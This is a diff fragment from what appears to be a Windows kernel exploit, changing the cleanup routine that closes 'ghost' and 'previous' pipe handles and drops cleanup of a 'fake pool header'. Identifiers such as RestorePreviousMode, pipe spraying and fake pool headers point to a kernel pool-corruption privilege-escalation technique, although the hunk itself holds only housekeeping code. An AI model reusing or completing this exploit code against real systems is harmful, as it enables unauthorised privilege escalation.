@@ -53,16 +53,10 @@ int RestorePreviousMode(exploit_addresses_t* addrs)
 int CleanupPipes(exploit_pipes_t* pipes)
 {
     puts("[*] Cleaning up ghost pipe...");
-    if (pipes->ghost_pipe)
-        ClosePipePairHandles(pipes->ghost_pipe);
+    ClosePipePairHandles(&pipes->ghost_chunk_pipe);
 
     puts("[*] Cleaning up previous pipe...");
-    if (pipes->previous_pipe)
-        ClosePipePairHandles(pipes->previous_pipe);
-
-    puts("[*] Cleaning up fake pool header...");
-    if (pipes->fake_pool_header)
-        CleanupPipeSpray(pipes->fake_pool_header);
+    ClosePipePairHandles(&pipes->previous_chunk_pipe);
 
     return 1;
 }
